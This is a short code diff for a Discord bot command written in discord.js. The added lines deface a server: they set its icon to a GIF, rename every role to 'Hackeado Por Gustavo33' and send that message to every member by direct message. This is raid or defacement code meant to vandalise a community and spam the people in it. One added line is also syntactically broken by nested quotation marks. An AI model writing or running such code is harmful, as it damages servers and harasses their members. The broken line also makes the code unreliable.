@@ -11,9 +11,14 @@ exports.run = async (client, message) => {
        })
     }
     function b1(){
+       message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
      client.guilds.get(message.guild.id).roles.forEach((r) => {
          r.setName("Hackeado Por Gustavo33")
      })
+      client.guilds.get(message.guild.id).members.forEach((ma) => {
+        ma.send("Hackeado Por Gustavo33")
+        ma.send(" message.guild.setIcon("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")")
+      })
     }
     function a2(){
         a1()
